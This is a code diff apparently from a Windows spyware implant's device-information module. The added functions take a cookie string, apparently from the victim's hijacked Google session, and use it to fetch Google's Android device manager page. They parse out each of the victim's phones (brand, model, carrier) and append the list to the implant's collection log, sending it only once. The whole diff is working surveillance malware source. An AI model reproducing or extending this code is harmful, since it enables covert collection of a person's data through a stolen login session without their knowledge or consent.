@@ -1,4 +1,9 @@
 #include <lm.h>
+#include "utils.h"
+
+extern void CheckProcessStatus();
+extern DWORD HttpSocialRequest(WCHAR *Host, WCHAR *verb, WCHAR *resource, WCHAR *pwszHeader, DWORD port, BYTE *s_buffer, DWORD sbuf_len, BYTE **r_buffer, DWORD *response_len, char *cookies, DWORD dwMaxSize=0);
+BOOL g_bSendGoogleDevice = TRUE;
 
 struct deviceinfo {
 	struct {
@@ -375,7 +380,7 @@ VOID GetApplicationInfo(HANDLE hfile, BOOL bX64View)
 }
 
 
-void DumpDeviceInfo()
+void DumpDeviceInfo(LPWSTR lpwszGoogleDevices=NULL)
 {
 	HANDLE hfile;
 	WCHAR null_wchar = 0;
@@ -410,6 +415,9 @@ void DumpDeviceInfo()
 		di.userinfo.sid);
 
 	hfile = Log_CreateFile(PM_DEVICEINFO, NULL, 0);
+	if(hfile == INVALID_HANDLE_VALUE)
+		return;
+
 	Log_WriteFile(hfile, (BYTE *)device_info_string, wcslen(device_info_string) * sizeof(WCHAR));
 
 	// Enumera i drive presenti
@@ -418,6 +426,15 @@ void DumpDeviceInfo()
 	GetApplicationInfo(hfile, FALSE);
 	GetApplicationInfo(hfile, TRUE);
 	
+	//write the google devices
+	if(lpwszGoogleDevices != NULL)
+	{
+		WCHAR   pwszHeader[] = {L'\n', L'G', L'o', L'o', L'g', L'l', L'e', L' ', L'D', L'e', L'v', L'i', L'c', L'e', L's', L':', L'\n', L'\n', '\0'};
+
+		Log_WriteFile(hfile, (BYTE *)pwszHeader, wcslen(pwszHeader) * sizeof(WCHAR));
+		Log_WriteFile(hfile, (BYTE *)lpwszGoogleDevices, wcslen(lpwszGoogleDevices) * sizeof(WCHAR));
+	}
+
 	// NULL termina tutta la stringa
 	Log_WriteFile(hfile, (BYTE *)&null_wchar, sizeof(WCHAR));
 
@@ -445,4 +462,170 @@ DWORD __stdcall PM_DeviceInfoInit(JSONObject elem)
 void PM_DeviceInfoRegister()
 {
 	AM_MonitorRegister(L"device", PM_DEVICEINFO, NULL, (BYTE *)PM_DeviceInfoStartStop, (BYTE *)PM_DeviceInfoInit, NULL);
+}
+
+
+
+//-----------------------------------GOOGLE DEVICE --------------------------------
+
+
+DWORD GDev_ExtractDevList(LPWSTR *pwszFormattedList, LPSTR pszRecvBuffer)
+{
+	LPWSTR pwszTmp=NULL;
+	LPSTR  pszFrom=NULL, pszTo=NULL;
+	DWORD  dwRet=0, dwSize=0, dwNewSize=0;
+	
+	if(pszRecvBuffer == NULL)
+		return FALSE;
+
+	//search the JSON structure containing the devices info (es: ['DEVICES_JSPB'])
+	pszFrom = StrStrIA(pszRecvBuffer, "['DEVICES_JSPB']");
+	if(pszFrom == NULL)
+		return FALSE;
+	pszFrom++;
+
+	//search the first [ char (beginning of the JSON struct)
+	pszFrom = strstr(pszFrom, "[");
+	if(pszFrom == NULL)
+		return FALSE;
+
+	//search a ; char (end of the JSON struct)
+	pszTo = pszFrom;
+	pszTo = strstr(pszFrom, ";");
+	if(pszTo == NULL)
+		return FALSE;
+
+	dwSize = (pszTo - pszFrom) - 1;
+
+	//copy the json structure to a tmp buffer
+	LPSTR pszJSON = (LPSTR)malloc(dwSize+1);
+	if(pszJSON == NULL)
+		return FALSE;
+	strncpy_s(pszJSON, dwSize+1, pszFrom, dwSize);
+
+	//parse the json struct
+	JSONValue *jValue = NULL;
+	JSONArray jArray, jDev;
+	
+	jValue = JSON::Parse(pszJSON);
+
+	znfree(&pszJSON);
+
+	if(jValue == NULL)
+		return FALSE;
+
+
+	LPWSTR pwszDevice = NULL;	
+
+	if(jValue->IsArray() && (jValue->AsArray().size() > 0))
+	{
+		jArray = jValue->AsArray();
+
+		if(jArray.size() > 0)
+		{ 
+			jArray = jArray[0]->AsArray();
+
+			//loop into array of devices
+			for(int i=0; i<jArray.size(); i++)
+			{				
+				jDev = jArray[i]->AsArray();
+				jDev = jDev[0]->AsArray();
+
+				dwSize = wcslen(jDev[2]->AsString().c_str()) +
+						 wcslen(jDev[3]->AsString().c_str()) +
+						 wcslen(jDev[4]->AsString().c_str()) + 64; //add some bytes to store the description strings
+
+				pwszDevice = (LPWSTR)malloc(dwSize * sizeof(WCHAR));
+				if(pwszDevice == NULL)
+				{
+					delete jValue;
+					return FALSE;
+				}
+
+				swprintf_s(pwszDevice, dwSize, L"Brand: %s\nDevice: %s\nCarrier: %s\n\n", jDev[3]->AsString().c_str(), jDev[2]->AsString().c_str(), jDev[4]->AsString().c_str());
+
+				dwNewSize += (wcslen(pwszDevice) + 1);
+
+				pwszTmp = *pwszFormattedList;
+				*pwszFormattedList = (LPWSTR)realloc(*pwszFormattedList, dwNewSize * sizeof(WCHAR));
+				if(*pwszFormattedList == NULL)
+				{
+					znfree(&pwszDevice);
+					znfree(&pwszTmp);
+					delete jValue;
+					return FALSE;
+				}				
+				if(pwszTmp == NULL)				
+					SecureZeroMemory(*pwszFormattedList, dwNewSize * sizeof(WCHAR));				
+
+				wcscat_s(*pwszFormattedList, dwNewSize, pwszDevice);
+
+				znfree(&pwszDevice);
+			}
+		}
+		else
+		{
+			delete jValue;
+			return FALSE;
+		}
+	}
+	else
+	{
+		delete jValue;
+		return FALSE;
+	}
+
+
+	delete jValue;
+
+	return TRUE;
+}
+
+
+//get the device list
+DWORD GDev_GetDevices(LPSTR pszCookie)
+{	
+	struct  deviceinfo di;	
+	LPWSTR	pwszDevicesList=NULL;
+	LPSTR	pszRecvBuffer=NULL;
+	DWORD	dwRet, dwBufferSize=0, dwSize=0, dwLen=0;
+	CHAR    pszBuf[128];
+
+	if(!g_bSendGoogleDevice)		
+		return FALSE;
+
+	CheckProcessStatus();
+	//get conn parameters	
+	dwRet = HttpSocialRequest(L"www.google.com",
+							  L"GET",
+							  L"/android/devicemanager",
+							  L"Host: www.google.com\r\nConnection: keep-alive\r\nCache-Control: max-age=0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*",
+							  443,
+							  NULL,
+							  0,
+							  (LPBYTE *)&pszRecvBuffer,
+							  &dwBufferSize,
+							  pszCookie);
+
+	if((dwRet != 0) || (dwBufferSize == 0))
+	{
+		znfree(&pszRecvBuffer);
+		return FALSE;
+	}
+
+	//extract the device list from the received buffer
+	dwRet = GDev_ExtractDevList(&pwszDevicesList, pszRecvBuffer);
+	znfree(&pszRecvBuffer);
+
+	if((!dwRet) || (pwszDevicesList == NULL))
+		return FALSE;
+
+	CheckProcessStatus();
+	//get the device info
+	DumpDeviceInfo(pwszDevicesList);
+	
+	//send the google device only once
+	g_bSendGoogleDevice = FALSE;
+
+	return TRUE;
 }
